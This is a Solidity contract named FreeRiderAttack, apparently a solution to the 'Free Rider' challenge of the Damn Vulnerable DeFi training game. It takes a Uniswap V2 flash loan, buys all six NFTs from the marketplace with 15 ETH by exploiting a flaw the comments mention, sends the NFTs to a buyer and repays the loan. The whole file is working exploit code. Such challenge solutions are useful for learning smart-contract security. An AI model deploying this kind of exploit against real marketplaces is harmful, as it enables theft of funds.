// SPDX-License-Identifier: SEE LICENSE IN LICENSE

import "openzeppelin-contracts/token/ERC721/ERC721.sol";
import "uniswap/contracts/interfaces/IUniswapV2Callee.sol";
import "uniswap/contracts/interfaces/IUniswapV2Factory.sol";
import "uniswap/contracts/interfaces/IUniswapV2Pair.sol";
import "uniswap/contracts/interfaces/IERC20.sol";

import "../Contracts/free-rider/FreeRiderNFTMarketplace.sol";

pragma solidity ^0.8.0;

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    using Address for address;

    address payable immutable WETH;
    address immutable DVT;
    address uniswapFactory;
    address payable NftMarketPlace;
    address immutable buyer;
    address immutable nft;

    constructor(
        address payable _WETH,
        address _DVT,
        address _uniswapFactory,
        address payable _NftMarketPlace,
        address _buyer,
        address _nft
    ) {
        WETH = _WETH;
        DVT = _DVT;
        uniswapFactory = _uniswapFactory;
        NftMarketPlace = _NftMarketPlace;
        buyer = _buyer;
        nft = _nft;
    }

    //  flashloan
    function flashLoan(address _tokenBorrow, uint256 _amount) external {
        // checking pair address
        address pair = IUniswapV2Factory(uniswapFactory).getPair(
            _tokenBorrow,
            DVT
        );
        require(pair != address(0), "!pair init");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        // checking if we are borrowing correct token or not
        uint256 amount0 = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1 = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount);

        // Call uniswap for a flashloan
        IUniswapV2Pair(pair).swap(amount0, amount1, address(this), data);
    }

    // callback from uniswap

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(uniswapFactory).getPair(
            token0,
            token1
        );

        require(msg.sender == pair, "!pair");
        require(sender == address(this), "!sender");

        // Decode custom data set in flashLoan()
        (address tokenBorrow, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );

        // Calculate Loan repayment
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));

        // Withdraw all WETH to ETH
        tokenBorrow.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", currBal)
        );

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        // Purchase all NFTs for 15 ETH
        FreeRiderNFTMarketplace(NftMarketPlace).buyMany{value: 15 ether}(
            tokenIds
        );

        // transfer all NFTs to buyer
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }

        // Deposit ETH into WETH contract
        // ETH came from Buyer Contract + Marketplace exploit
        (bool success, ) = WETH.call{value: 15.1 ether}("");
        require(success, "failed to deposit weth");

        // Pay back Loan with deposited WETH funds
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    // Interface required to receive NFT as a Smart Contract
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
